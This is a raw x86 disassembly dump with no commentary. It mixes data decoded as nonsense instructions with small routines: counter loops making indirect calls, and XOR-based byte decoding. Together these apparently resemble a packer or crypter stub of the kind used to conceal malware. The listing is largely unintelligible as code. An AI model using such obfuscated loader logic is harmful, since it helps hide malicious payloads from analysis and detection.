  4032c7:	sub    esp,DWORD PTR [edx-0xb]
  4032ca:	and    BYTE PTR [ebx-0x37],ch
  4032cd:	mov    eax,0x90f60f3c
  4032d2:	xor    BYTE PTR [edi-0x5d],cl
  4032d5:	cdq    
  4032d6:	pop    ecx
  4032d7:	push   ecx
  4032d8:	push   cs
  4032d9:	jbe    0x4032e2
  4032db:	pop    edi
  4032dc:	aam    0x80
  4032de:	dec    ebp
  4032df:	mov    al,ds:0x8c95d9e1
  4032e4:	addr16 (bad) 
  4032e6:	(bad)  [ecx-0x525974b6]
  4032ec:	cld    
  4032ed:	sub    al,0xe2
  4032ef:	(bad)
  4032f2:	sbb    al,0x28
  4032f4:	xor    esi,esi
  4032f6:	test   al,cl
  4032f8:	inc    edi
  4032f9:	(bad)  
  4032fa:	add    al,0x35
  4032fc:	inc    ebx
  4032fd:	jae    0x4032ca
  4032ff:	add    eax,edx
  403301:	(bad)  
  403302:	pop    ebp
  403303:	mov    al,0x26
  403305:	mov    esi,0xe4452d53
  40330a:	adc    eax,0xcea1c1a0
  40330f:	sub    cl,al
  403311:	mov    ch,0x48
  403313:	mov    ecx,DWORD PTR [ebp-0x3d304b85]
  403319:	arpl   WORD PTR [edx-0x51b6e99e],bp
  40331f:	rcr    DWORD PTR [edi+0x3a],0xd7
  403323:	xor    ecx,DWORD PTR [eax]
  403325:	stos   BYTE PTR es:[edi],al
  403326:	js     0x403363
  403328:	xor    eax,0x7d19a4d8
  40332d:	test   DWORD PTR [esi+0x602f952e],eax
  403333:	dec    ebx
  403334:	mov    ah,0xb8
  403336:	outs   dx,BYTE PTR ds:[esi]
  403337:	lods   al,BYTE PTR ds:[esi]
  403338:	mov    BYTE PTR [edx],bl
  40333a:	mov    eax,0xa8e444a7
  40333f:	lods   al,BYTE PTR ds:[esi]
  403340:	pop    ebp
  403341:	fcomp  QWORD PTR [ebp-0x5f]
  403344:	mov    ah,0xbd
  403346:	dec    edi
  403347:	inc    edi
  403348:	dec    esp
  403349:	stos   DWORD PTR es:[edi],eax
  40334a:	xchg   DWORD PTR [ebx-0x5de431e],ebp
  403350:	pop    edx
  403351:	adc    bl,BYTE PTR [esi+0x68]
  403354:	lea    ecx,[eax]
  403356:	fidiv  WORD PTR [edi-0x30]
  403359:	adc    esi,DWORD PTR ds:0x4706ff06
  40335f:	or     eax,0xb8d36952
  403364:	nop
  403365:	popf   
  403366:	sbb    BYTE PTR [ebx+0x31],bh
  403369:	in     eax,0x6
  40336b:	sbb    al,0x3c
  40336d:	cmp    DWORD PTR [edx],edx
  40336f:	xchg   ecx,eax
  403370:	mov    ds:0xd5f88eff,al
  403375:	xor    edi,ecx
  403377:	retf   
  403378:	rol    DWORD PTR [esi+eax*8],0x22
  40337c:	test   eax,0xa37b9a74
  403381:	nop
  403382:	jb     0x4033b4
  403384:	cmp    eax,0xd73bd603
  403389:	mov    DWORD PTR ds:0x4292b5,0x6344
  403393:	ja     0x4034eb
  403399:	push   ebx
  40339a:	jmp    0x4033a4
  40339f:	mov    esi,0x32729e
  4033a4:	mov    eax,DWORD PTR [ebp-0x8]
  4033a7:	mov    edi,DWORD PTR [ebp-0x4]
  4033aa:	xor    edi,ecx
  4033ac:	add    edi,esi
  4033ae:	mov    esi,DWORD PTR [ebp+0x8]
  4033b1:	imul   edi,edx
  4033b4:	mov    ebx,DWORD PTR [ebp+0xc]
  4033b7:	xor    eax,ecx
  4033b9:	add    eax,edx
  4033bb:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  4033c2:	mov    BYTE PTR [edi+esi*1],al
  4033c5:	mov    eax,DWORD PTR [ebp-0x4]
  4033c8:	xor    eax,ecx
  4033ca:	lea    edx,[edx+eax*1+0x32729e]
  4033d1:	mov    eax,DWORD PTR [ebp-0x4]
  4033d4:	jmp    0x4034d6
  4033d9:	jnp    0x4033fa
  4033db:	dec    BYTE PTR [eax-0x108252a6]
  4033e1:	pop    esi
  4033e2:	mov    DWORD PTR [edx],ebp
  4033e4:	pop    ebp
  4033e5:	mov    WORD PTR [ebx+0x37da464],?
  4033eb:	jl     0x403469
  4033ed:	push   ebx
  4033ee:	jl     0x40346c
  4033f0:	jl     0x40339f
  4033f2:	rcr    cl,1
  4033f4:	ret    
  4033f5:	test   esi,esi
  4033f7:	out    dx,al
  4033f8:	fld    TBYTE PTR [edx]
  4033fa:	sbb    BYTE PTR [ebp+0x7118e278],0x10
  403401:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  403403:	sbb    ah,dh
  403405:	or     al,0xba
  403407:	cdq    
  403408:	sbb    BYTE PTR [esi+0x23e3cfee],0x1d
  40340f:	ret    0xc90f
  403412:	lds    esi,FWORD PTR [eax+0x73]
  403415:	jmp    0x7e12c4e5
  40341a:	sub    eax,0x296ce214
  40341f:	inc    eax
  403420:	dec    ebp
  403421:	or     eax,0x2b2d71c9
  403426:	mov    esp,0x22e3895a
  40342b:	push   0xff917b7e
  403430:	sar    BYTE PTR es:[eax+0x15c42293],1
  403437:	(bad)  
  403438:	and    DWORD PTR [eax-0x3d],edx
  40343b:	ja     0x403467
  40343d:	rcr    esp,cl
  40343f:	in     eax,dx
  403440:	push   gs
  403442:	mov    dl,0x2a
  403444:	pusha  
  403445:	out    0xdc,eax
  403447:	les    ecx,FWORD PTR [eax+esi*2-0x59b72416]
  40344e:	pop    ecx
  40344f:	das    
  403450:	xchg   esi,eax
  403451:	scas   eax,DWORD PTR es:[edi]
  403452:	jge    0x4034c2
  403454:	jns    0x4033f2
  403456:	mov    dh,BYTE PTR [esi+ebx*4-0x1]
  40345a:	pop    ebp
  40345b:	sbb    al,0x5
  40345d:	(bad)  
  40345e:	sbb    al,0x56
  403460:	adc    DWORD PTR [ebx],edi
  403462:	aad    0x1
  403464:	repnz inc ebx
  403466:	jmp    0x472c:0x9dffb974
  40346d:	iret   
  40346e:	mov    esp,0x1f06e6ee
  403473:	pop    ss
  403474:	ret    0xcf3b
  403477:	cmc    
  403478:	push   esp
  403479:	push   ss
  40347a:	mov    cl,0xc7
  40347c:	sub    DWORD PTR [esi-0x14],0xfca4f6db
  403483:	xchg   esp,eax
  403484:	push   esp
  403485:	mov    ebx,0x5b2d8c7d
  40348a:	inc    ecx
  40348b:	mov    edi,0xb918bf2a
  403490:	icebp  
  403491:	mov    cl,BYTE PTR [ebx]
  403493:	add    DWORD PTR [esp+eiz*4+0x6093a238],esi
  40349a:	ins    BYTE PTR es:[edi],dx
  40349b:	rol    DWORD PTR [ebx-0x7e],cl
  40349e:	stc    
  40349f:	push   es
  4034a0:	out    dx,al
  4034a1:	xor    DWORD PTR [eax+0x534a9694],0x1a5863e9
  4034ab:	sti    
  4034ac:	or     DWORD PTR [edi+0x7],esi
  4034af:	pusha  
  4034b0:	stc    
  4034b1:	mov    esi,0x7765f58b
  4034b6:	ins    BYTE PTR es:[edi],dx
  4034b7:	repz dec ebx
  4034b9:	retf   0xfbdc
  4034bc:	out    0x26,eax
  4034be:	bound  esi,QWORD PTR ds:[edx]
  4034c1:	push   eax
  4034c2:	add    ebp,DWORD PTR [ecx+0x517e70e]
  4034c8:	test   cl,al
  4034ca:	jmp    0x19c14ac7
  4034cf:	enter  0x3779,0xec
  4034d3:	inc    esi
  4034d4:	xchg   ebx,eax
  4034d5:	mov    esi,0x62bec133
  4034da:	(bad)  
  4034db:	int    0xff
  4034dd:	sub    esi,eax
  4034df:	add    esi,DWORD PTR [ebp+0x10]
  4034e2:	cmp    edx,esi
  4034e4:	jbe    0x40339f
  4034ea:	pop    ebx
  4034eb:	mov    eax,0xf89c8534
  4034f0:	pop    edi
  4034f1:	pop    esi
  4034f2:	leave  
  4034f3:	ret    0xc
  4034f6:	push   ebp
  4034f7:	mov    ebp,esp
  4034f9:	mov    eax,ds:0x409224
  4034fe:	movzx  ecx,BYTE PTR ds:0x4292c1
  403505:	add    DWORD PTR ds:0x4275ac,ecx
  40350b:	mov    edx,0x32729e
  403510:	mov    DWORD PTR ds:0x4292d9,0x1e
  40351a:	cmp    DWORD PTR ds:0x4292d9,0x0
  403521:	je     0x4035b5
  403527:	cmp    DWORD PTR ds:0x4292d9,0x27
  40352e:	jne    0x40353f
  403534:	push   0x1072
  403539:	call   DWORD PTR ds:0x427c43
  40353f:	mov    ecx,DWORD PTR ds:0x4292d9
  403545:	dec    ecx
  403546:	mov    DWORD PTR ds:0x4292d9,ecx
  40354c:	jmp    0x40351a
  403551:	and    DWORD PTR ds:0x4292c5,0x0
  40355b:	xor    ecx,ecx
  40355d:	or     ecx,DWORD PTR ds:0x4292c5
  403563:	inc    ecx
  403564:	mov    DWORD PTR ds:0x4292c5,ecx
  40356a:	cmp    DWORD PTR ds:0x4292c5,0xd
  403571:	jne    0x40358c
  403577:	push   0x42c892
  40357c:	push   0x4275ed
  403581:	push   0x400000
  403586:	call   DWORD PTR ds:0x427a93
  40358c:	cmp    DWORD PTR ds:0x4292c5,0xc
  403593:	jne    0x4035a8
  403599:	xor    ecx,ecx
  40359b:	or     ecx,DWORD PTR ds:0x4292c5
  4035a1:	inc    ecx
  4035a2:	mov    DWORD PTR ds:0x4292c5,ecx
  4035a8:	cmp    DWORD PTR ds:0x4292c5,0x17
  4035af:	jb     0x40355b
  4035b5:	sub    eax,edx
  4035b7:	mov    ecx,DWORD PTR ds:0x42c8ae
  4035bd:	mov    ecx,DWORD PTR [ecx]
  4035bf:	sbb    DWORD PTR ds:0x4275b0,ecx
  4035c5:	mov    ecx,0x7510857
  4035ca:	push   esi
  4035cb:	mov    esi,DWORD PTR [ebp+0xc]
  4035ce:	xor    eax,ecx
  4035d0:	cmp    eax,esi
  4035d2:	je     0x403916
  4035d8:	mov    eax,ds:0x40921c
  4035dd:	mov    esi,DWORD PTR [ebp+0xc]
  4035e0:	sub    eax,edx
  4035e2:	jmp    0x4036e1
  4035e7:	not    DWORD PTR [ebx-0x6c]
  4035ea:	adc    ch,BYTE PTR [eax-0x13]
  4035ed:	lea    ebp,[ebp+0x4f]
  4035f0:	xchg   edi,eax
  4035f1:	xchg   esp,eax
  4035f2:	cwde   
  4035f3:	ins    DWORD PTR es:[edi],dx
  4035f4:	or     DWORD PTR [edx+esi*1+0x7c7c0250],edi
  4035fb:	pop    esi
  4035fc:	jl     0x40367a
  4035fe:	jl     0x4035ff
  403600:	mov    esp,0x833c0ef1
  403605:	xchg   DWORD PTR [esi+0x40],edx
  403608:	pop    esp
  403609:	cmp    al,0x7e
  40360b:	or     dl,BYTE PTR [edi+0x606d1fa6]
  403611:	xchg   esi,eax
  403612:	mov    al,ds:0x23b25926
  403617:	shl    DWORD PTR [ebx],cl
  403619:	(bad)  
  40361a:	and    al,0xef
  40361c:	add    al,0x57
  40361e:	cdq    
  40361f:	xor    ebp,eax
  403621:	inc    edi
  403622:	jmp    0x76dd:0x9ff11034
  403629:	sahf   
  40362a:	fsub   DWORD PTR [ecx]
  40362c:	inc    ecx
  40362d:	aaa    
  40362e:	sti    
  40362f:	outs   dx,DWORD PTR ds:[esi]
  403630:	fbld   TBYTE PTR [ecx-0x7c]
  403633:	add    DWORD PTR [ebx-0x6],esp
  403636:	push   es
  403637:	inc    edi
  403638:	xor    DWORD PTR [edi-0x3db5c731],esi
  40363e:	sti    
  40363f:	arpl   WORD PTR ds:0x485706d7,sp
  403645:	inc    esi
  403646:	ja     0x403651
  403648:	das    
  403649:	cmp    eax,0x5f619bd2
  40364e:	ja     0x4035df
  403650:	test   BYTE PTR [ecx+eax*8+0x16],bl
  403654:	sar    BYTE PTR [esi-0xa2e4037],cl
  40365a:	inc    eax
  40365b:	enter  0x8546,0xe3
  40365f:	addr16 inc edi
  403661:	xchg   BYTE PTR [ecx-0xe431174],dh
  403667:	ret    0x48e9
  40366a:	data16 sbb al,0xcf
  40366d:	push   ebp
  40366e:	cmp    cl,BYTE PTR [eax]
  403670:	sbb    DWORD PTR [edx+0x48],0xfffffff8
  403674:	fiadd  DWORD PTR [ebx]
  403676:	and    eax,0xf7202660
  40367b:	push   ss
  40367c:	push   0x5107daf1
  403681:	mov    ah,0x33
  403683:	push   ebp
  403684:	sahf   
  403685:	mov    bh,0x8a
  403687:	test   BYTE PTR [ebx],al
  403689:	push   esp
  40368a:	jl     0x403614
  40368c:	mov    ds:0x1c80b229,al
  403691:	jne    0x4036a1
  403693:	mov    ch,0xbf
  403695:	out    0xce,eax
  403697:	xor    BYTE PTR [esi-0x64416728],dh
  40369d:	loopne 0x4036d2
  40369f:	icebp  
  4036a0:	add    cl,BYTE PTR [ebp-0x79d033dc]
  4036a6:	cwde   
  4036a7:	sub    ebp,esi
  4036a9:	ss js  0x4036c2
  4036ac:	inc    edi
  4036ad:	into   
  4036ae:	mov    eax,0x24e0be9b
  4036b3:	jl     0x40363a
  4036b5:	arpl   WORD PTR ds:0x2f94ff4b,cx
  4036bb:	sub    al,0xd3
  4036bd:	inc    eax
  4036be:	inc    esp
  4036bf:	das    
  4036c0:	stc    
  4036c1:	shl    eax,1
  4036c3:	(bad)  
  4036c4:	aas    
  4036c5:	rcl    BYTE PTR [edx+0x270f68ba],cl
  4036cb:	gs jbe 0x403737
  4036ce:	cmp    edi,DWORD PTR [esi-0xa]
  4036d1:	sbb    al,0xc5
  4036d3:	arpl   WORD PTR [edi-0xe6e76b0],ax
  4036d9:	(bad)  
  4036da:	loop   0x40369b
  4036dc:	jecxz  0x403744
  4036de:	sbb    ebp,DWORD PTR [ebx]
  4036e0:	ret    0xc133
  4036e3:	cmp    eax,esi
  4036e5:	jne    0x4037fa
  4036eb:	mov    eax,ds:0x409224
  4036f0:	add    eax,DWORD PTR ds:0x40921c
  4036f6:	jmp    0x403900
  4036fb:	jmp    0x4037fa
  403700:	xchg   esi,eax
  403701:	xchg   ebx,eax
  403702:	pop    ecx
  403703:	test   BYTE PTR [ebp+0x7a],bl
  403706:	imul   esp,DWORD PTR [ebp-0x47e923f9],0x7acbdd91
  403710:	mov    dl,0x5
  403712:	jl     0x403790
  403714:	pop    esi
  403715:	jl     0x403793
  403717:	jl     0x4036d5
  403719:	mov    esi,0x4a31b291
  40371e:	mov    dh,0xa0
  403720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403722:	xchg   esp,eax
  403723:	or     BYTE PTR [ebx],ch
  403725:	mov    WORD PTR [edi-0x48],?
  403728:	loopne 0x403705
  40372a:	ret    
  40372b:	push   ebx
  40372c:	fmul   DWORD PTR [ebx-0x12cc2aac]
  403732:	inc    ebp
  403733:	sbb    al,0x58
  403735:	or     BYTE PTR [ebx-0x7a8a70ee],ah
  40373b:	add    al,0x6e
  40373d:	dec    ecx
  40373e:	stos   DWORD PTR es:[edi],eax
  40373f:	ret    
  403740:	inc    ebp
  403741:	out    0x39,al
  403743:	mov    ecx,0x1c5e8b2c
  403748:	lods   eax,DWORD PTR ds:[esi]
  403749:	in     al,0x8c
  40374b:	xchg   edx,eax
  40374c:	cli    
  40374d:	or     ah,BYTE PTR ds:0x8a45b336
  403753:	ins    DWORD PTR es:[edi],dx
  403754:	jns    0x4037c7
  403756:	ficom  DWORD PTR [ebp+0x43]
  403759:	push   ebx
  40375a:	add    BYTE PTR [edi-0x46ab1adb],dl
  403760:	push   ds
  403761:	push   ds
  403762:	ficomp DWORD PTR [ecx+ebx*1+0x5b]
  403766:	and    bh,BYTE PTR [edi+0x65]
  403769:	rcr    DWORD PTR [esi],cl
  40376b:	aam    0x8c
  40376d:	mov    ds:0xcd2c5ae3,al
  403772:	int3   
  403773:	mov    eax,0x4f42007a
  403778:	add    bl,BYTE PTR [ebx-0x18]
  40377b:	out    0xd4,eax
  40377d:	mov    al,0x59
  40377f:	cwde   
  403780:	(bad)  [edx]
  403782:	xor    eax,0x13264466
  403787:	icebp  
  403788:	mov    ebx,0x4051d2e5
  40378d:	push   ebx
  40378e:	sbb    eax,0x332dd712
  403793:	push   0xffffffc1
  403795:	std    
  403796:	(bad)  
  403797:	or     ecx,DWORD PTR [edx]
  403799:	lods   al,BYTE PTR gs:[esi]
  40379b:	dec    edx
  40379c:	and    al,0x76
  40379e:	mov    edi,0xea4a418b
  4037a3:	retf   
  4037a4:	fbstp  TBYTE PTR [edi+0x3e8cb799]
  4037aa:	cmp    DWORD PTR [ebp+0x511705a6],ebp
  4037b0:	idiv   esi
  4037b2:	push   ebx
  4037b3:	or     dh,bh
  4037b5:	jmp    0xe61323cc
  4037ba:	sbb    ebx,DWORD PTR [edx+0x7e]
  4037bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037be:	xchg   edi,eax
  4037bf:	and    DWORD PTR [ecx+0x1360a5fb],ecx
  4037c5:	mov    esp,0x23a4aaae
  4037ca:	cmp    BYTE PTR [eax+0x8a6b27b],cl
  4037d0:	inc    edi
  4037d1:	cmp    bh,BYTE PTR [ebp+0x7fabc2e7]
  4037d7:	sbb    bl,ch
  4037d9:	lock push ebx
  4037db:	mul    esp
  4037dd:	das    
  4037de:	rol    esp,0x86
  4037e1:	and    esp,DWORD PTR [edx+0x49]
  4037e4:	cs icebp 
  4037e6:	inc    ebx
  4037e7:	sahf   
  4037e8:	ja     0x4037bb
  4037ea:	cmp    esi,DWORD PTR [ebx]
  4037ec:	xor    esp,DWORD PTR [edx+0x1b]
  4037ef:	mov    bl,0xbe
  4037f1:	and    BYTE PTR [eax+0x1],dl
  4037f4:	mov    esp,0xb52252
  4037f9:	xor    BYTE PTR [ebx-0x516f3bb],cl
  4037ff:	add    BYTE PTR [eax],al
  403801:	add    BYTE PTR [eax+edi*1],al
  403804:	and    DWORD PTR [ebx-0x5b],0x27bfa7d
  40380b:	jg     0x40385f
  40380d:	and    BYTE PTR [eax],dl
  40380f:	dec    esi
  403810:	mov    WORD PTR [ecx],?
  403812:	xchg   esp,eax
  403813:	add    al,0x7c
  403815:	jl     0x403875
  403817:	jl     0x403895
  403819:	jl     0x40388e
  40381b:	fbstp  TBYTE PTR [ecx+ecx*2-0x4b483059]
  403822:	jp     0x40382a
  403824:	shr    BYTE PTR [ecx+0x7495822b],cl
  40382a:	add    eax,0x35f62b98
  40382f:	dec    edx
  403830:	js     0x4037b2
  403832:	mov    ds:0x793a2f0,al
  403837:	dec    BYTE PTR [edi-0x78934570]
  40383d:	or     ebx,DWORD PTR [esp+eiz*2]
  403840:	add    al,0xbe
  403842:	mov    ?,WORD PTR [edx-0x39d9449d]
  403848:	jge    0x4037f9
  40384a:	cmc    
  40384b:	test   al,0xe9
  40384d:	mov    bl,0x8c
  40384f:	inc    BYTE PTR [ebp-0x30b1af5e]
  403855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403856:	mov    ah,0x77
  403858:	test   ebx,0xc98e516
  40385e:	mov    gs,WORD PTR [ecx]
  403860:	sbb    DWORD PTR [esi-0x4c],esi
  403863:	sar    BYTE PTR [esi+0x3ffdab0b],cl
  403869:	or     al,0x82
  40386b:	(bad)  
  40386c:	or     eax,0x6962d7f0
  403871:	enter  0x13e9,0x50
  403875:	fdiv   QWORD PTR [edi-0x2f]
  403878:	ret    0xedf5
  40387b:	inc    ebp
  40387c:	popf   
  40387d:	ret    0xc204
  403880:	loope  0x4038e8
  403882:	aas    
  403883:	inc    ebp
  403884:	cld    
  403885:	daa    
  403886:	(bad)  
  403887:	sub    DWORD PTR [ebx-0x7e],esi
  40388a:	xchg   esi,eax
  40388b:	xor    DWORD PTR [ebx+0x5],edx
  40388e:	xchg   esi,eax
  40388f:	fidivr WORD PTR [edx]
  403891:	mov    esp,0xbfbf85e4
  403896:	xor    al,0xbf
  403898:	push   ebx
  403899:	inc    eax
  40389a:	mov    al,ds:0xa13d2d26
  40389f:	data16 mov BYTE PTR [eax-0x53],ch
  4038a3:	pop    eax
  4038a4:	cld    
  4038a5:	arpl   WORD PTR [esi+edx*2+0x16],sp
  4038a9:	xor    esi,DWORD PTR [esi]
  4038ab:	sbb    eax,0xc0702dbd
  4038b0:	test   al,0xad
  4038b2:	inc    ebp
  4038b3:	sub    esi,DWORD PTR [eax-0x15]
  4038b6:	xor    BYTE PTR [esi+0xa],dl
  4038b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ba:	imul   DWORD PTR [eax+0x7d57afcc]
  4038c0:	shr    ebp,cl
  4038c2:	dec    ebp
  4038c3:	xchg   DWORD PTR [edx-0x3c],ebx
  4038c6:	adc    eax,0xb6d47ef8
  4038cb:	pop    eax
  4038cc:	xor    DWORD PTR [eax],ebx
  4038ce:	mov    BYTE PTR [ebp-0x6ed42e81],ch
  4038d4:	dec    edi
  4038d5:	or     eax,0x769a388d
  4038da:	add    ebx,esi
  4038dc:	inc    BYTE PTR ds:0x88af281c
  4038e2:	xchg   esi,eax
  4038e3:	out    0x84,al
  4038e5:	pop    ebx
  4038e6:	mov    dh,0xf9
  4038e8:	cdq    
  4038e9:	in     al,dx
  4038ea:	in     al,0xa0
  4038ec:	out    dx,al
  4038ed:	pusha  
  4038ee:	retf   0x1ac9
  4038f1:	sub    DWORD PTR [ecx-0x4a],esp
  4038f4:	add    ah,BYTE PTR [ebx-0x3bc8ad4c]
  4038fa:	lods   eax,DWORD PTR ds:[esi]
  4038fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038fc:	xor    eax,ecx
  4038fe:	add    eax,edx
  403900:	mov    ds:0x40921c,eax
  403905:	mov    eax,DWORD PTR [ebp+0xc]
  403908:	xor    eax,ecx
  40390a:	add    eax,edx
  40390c:	mov    ds:0x409224,eax
  403911:	jmp    0x403920
  403916:	mov    eax,ds:0x409224
  40391b:	mov    ds:0x40921c,eax
  403920:	mov    eax,DWORD PTR [ebp+0x8]
  403923:	mov    eax,DWORD PTR [eax]
  403925:	mov    ecx,DWORD PTR ds:0x40921c
  40392b:	add    DWORD PTR [eax],ecx
  40392d:	pop    esi
  40392e:	pop    ebp
  40392f:	ret    0x8
  403932:	push   ebp
  403933:	mov    ebp,esp
  403935:	sub    esp,0x58
  403938:	mov    DWORD PTR ds:0x42c89e,0x1c
  403942:	cmp    DWORD PTR ds:0x42c89e,0x0
  403949:	je     0x40397e
  40394f:	cmp    DWORD PTR ds:0x42c89e,0x22
  403956:	jne    0x40396b
  40395c:	push   DWORD PTR [ebp-0x14]
  40395f:	push   DWORD PTR [ebp-0x28]
  403962:	push   DWORD PTR [ebp-0x10]
  403965:	call   DWORD PTR ds:0x4278ef
  40396b:	xor    eax,eax
  40396d:	add    eax,DWORD PTR ds:0x42c89e
  403973:	dec    eax
  403974:	mov    ds:0x42c89e,eax
  403979:	jmp    0x403942
  40397e:	mov    ecx,DWORD PTR [ebp+0x8]
  403981:	mov    eax,0x8a42
  403986:	xor    ax,WORD PTR [ecx+0x20]
  40398a:	mov    ecx,0x3b08
  40398f:	add    ax,cx
  403992:	jmp    0x403a97
  403997:	sar    BYTE PTR [edi-0x226ae210],cl
  40399d:	jge    0x403a06
  40399f:	js     0x4039f2
  4039a1:	dec    edi
  4039a2:	mov    esi,0xe83dc435
  4039a7:	test   BYTE PTR [edi],0x7c
  4039aa:	jl     0x403a00
  4039ac:	jl     0x403a2a
  4039ae:	jl     0x40397d
  4039b0:	push   ebx
  4039b1:	cs ret 0xf91a
  4039b5:	imul   eax,DWORD PTR [eax+0x66f080a6],0xa88d4699
  4039bf:	cld    
  4039c0:	retf   0xd502
  4039c3:	rcr    al,1
  4039c5:	jl     0x403967
  4039c7:	aas    
  4039c8:	pop    es
  4039c9:	add    eax,0x2a72c8f7
  4039ce:	inc    esi
  4039cf:	inc    edi
  4039d0:	sbb    eax,0x9423b8c6
  4039d5:	sub    ch,BYTE PTR [edi]
  4039d7:	push   cs
  4039d8:	jmp    0x7a67:0x51148beb
  4039df:	(bad)  
  4039e0:	cmp    DWORD PTR [ebx+0x32],eax
  4039e3:	enter  0x2add,0x5e
  4039e7:	adc    al,0x22
  4039e9:	xor    eax,0x28a54674
  4039ee:	jbe    0x4039d5
  4039f0:	scas   al,BYTE PTR es:[edi]
  4039f1:	inc    esp
  4039f2:	add    DWORD PTR [edx],esp
  4039f4:	out    dx,al
  4039f5:	rcl    BYTE PTR [ebx],cl
  4039f7:	test   DWORD PTR [edi+eax*2],0x3f1763a8
  4039fe:	or     ebp,ecx
  403a00:	ror    DWORD PTR [ebx],cl
  403a02:	out    0xc6,eax
  403a04:	mov    dh,0xee
  403a06:	stos   DWORD PTR es:[edi],eax
  403a07:	push   esi
  403a08:	lods   eax,DWORD PTR ds:[esi]
  403a09:	ds dec edx
  403a0b:	fsubr  st,st(7)
  403a0d:	retf   0x604e
  403a10:	loopne 0x40399d
  403a12:	xchg   esp,eax
  403a13:	lods   al,BYTE PTR ds:[esi]
  403a14:	xchg   edx,eax
  403a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a16:	pusha  
  403a17:	sbb    eax,0x840cda3d
  403a1c:	mov    dh,0xe2
  403a1e:	jno    0x403a40
  403a20:	sbb    BYTE PTR [ebx+0x721c0669],cl
  403a26:	inc    ebp
  403a27:	mov    es,edx
  403a29:	retf   0x1b74
  403a2c:	add    ah,BYTE PTR [edx-0x21678e35]
  403a32:	dec    eax
  403a33:	fidiv  WORD PTR [edx-0x27ca4626]
  403a39:	mov    esi,?
  403a3b:	addr16 cli 
  403a3d:	push   edi
  403a3e:	dec    esp
  403a3f:	pop    ebp
  403a40:	adc    DWORD PTR [esi+0x7d],esp
  403a43:	loope  0x403a02
  403a45:	sti    
  403a46:	int    0x94
  403a48:	xor    al,BYTE PTR [esp+edx*2-0x1da31d24]
  403a4f:	enter  0xce65,0x53
  403a53:	(bad)
  403a57:	sbb    al,dh
  403a59:	repnz jecxz 0x403aa8
  403a5c:	and    al,0x83
  403a5e:	lea    ebp,[esi+0x7a]
  403a61:	fs dec edi
  403a63:	cmp    bl,dl
  403a65:	retf   
  403a66:	loope  0x403a5d
  403a68:	mov    bh,0xe
  403a6a:	push   esi
  403a6b:	cdq    
  403a6c:	cs mov bh,0xec
  403a6f:	cld    
  403a70:	mov    ch,bh
  403a72:	mov    ds:0xd8aab622,eax
  403a77:	xchg   ecx,eax
  403a78:	mov    ds:0x283d75ab,eax
  403a7d:	sbb    DWORD PTR [eax+0x63c81f2c],0xffffffa2
  403a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a85:	out    0x2e,al
  403a87:	push   edx
  403a88:	dec    ebx
  403a89:	ror    esp,cl
  403a8b:	(bad)  
  403a8d:	loopne 0x403a90
  403a8f:	(bad)  [ebp+0x56]
  403a92:	add    BYTE PTR [ebp+0xfd02f81],0xb7
  403a99:	shl    BYTE PTR [ebx],0xc9
  403a9c:	xor    ecx,DWORD PTR ds:0x427db0
  403aa2:	mov    ecx,DWORD PTR [ecx]
  403aa4:	or     DWORD PTR ds:0x42c88a,ecx
  403aaa:	mov    DWORD PTR [ebp-0xc],eax
  403aad:	adc    DWORD PTR ds:0x42c882,ecx
  403ab3:	mov    BYTE PTR [ebp-0x1],0x7f
  403ab7:	not    ecx
  403ab9:	lea    eax,[ebp-0x1]
  403abc:	xor    DWORD PTR ds:0x42c88a,0x4292b9
  403ac6:	mov    DWORD PTR [ebp-0x10],eax
  403ac9:	mov    DWORD PTR ds:0x427d0f,0x12
  403ad3:	cmp    DWORD PTR ds:0x427d0f,0x0
  403ada:	je     0x403b2a
  403ae0:	cmp    DWORD PTR ds:0x427d0f,0x8
  403ae7:	jne    0x403af6
  403aed:	push   DWORD PTR [ebp-0xc]
  403af0:	call   DWORD PTR ds:0x4279cf
  403af6:	cmp    DWORD PTR ds:0x427d0f,0x9
  403afd:	jne    0x403b12
  403b03:	xor    ecx,ecx
  403b05:	xor    ecx,DWORD PTR ds:0x427d0f
  403b0b:	dec    ecx
  403b0c:	mov    DWORD PTR ds:0x427d0f,ecx
  403b12:	mov    ecx,DWORD PTR ds:0x427d0f
  403b18:	dec    ecx
  403b19:	mov    DWORD PTR ds:0x427d0f,ecx
  403b1f:	jmp    0x403ad3
  403b24:	sbb    DWORD PTR ds:0x4292bd,edi
  403b2a:	mov    al,BYTE PTR [ebp-0x1]
  403b2d:	xor    DWORD PTR ds:0x4292b9,0x35da
  403b37:	mov    ecx,DWORD PTR [ebp-0x10]
  403b3a:	xor    DWORD PTR ds:0x4292bd,0x513b
  403b44:	xor    al,0x49
  403b46:	xor    DWORD PTR ds:0x42c89a,0x3273
  403b50:	sub    al,0x35
  403b52:	add    DWORD PTR ds:0x4292a5,0x42759c
  403b5c:	mov    BYTE PTR [ecx],al
  403b5e:	xor    DWORD PTR ds:0x427d17,0x427d07
  403b68:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  403b6f:	jmp    0x403c74
  403b74:	(bad)  
  403b75:	xor    cl,BYTE PTR [edi]
  403b77:	adc    ebx,DWORD PTR [ebx]
  403b79:	in     eax,0xfa
  403b7b:	std    
  403b7c:	add    edi,DWORD PTR [edx+0x2f47c73f]
  403b82:	cmp    dl,al
  403b84:	out    dx,al
  403b85:	push   es
  403b86:	jl     0x403c04
  403b88:	push   esp
  403b89:	jl     0x403c07
  403b8b:	jl     0x403b59
  403b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b8e:	push   esi
  403b8f:	outs   dx,BYTE PTR ds:[esi]
  403b90:	xor    BYTE PTR [eax-0x6d7fc921],bh
  403b96:	xchg   BYTE PTR [ebx+0x43142b10],ah
  403b9c:	mov    eax,0x5d534a29
  403ba1:	lock adc al,0xa2
  403ba4:	mov    dl,BYTE PTR [ecx+0x53]
  403ba7:	aad    0x4
  403ba9:	adc    eax,0xc45df0c
  403bae:	push   edi
  403baf:	jae    0x403c07
  403bb1:	and    bh,al
  403bb3:	in     al,0xec
  403bb5:	sub    esi,DWORD PTR [edi-0x1a]
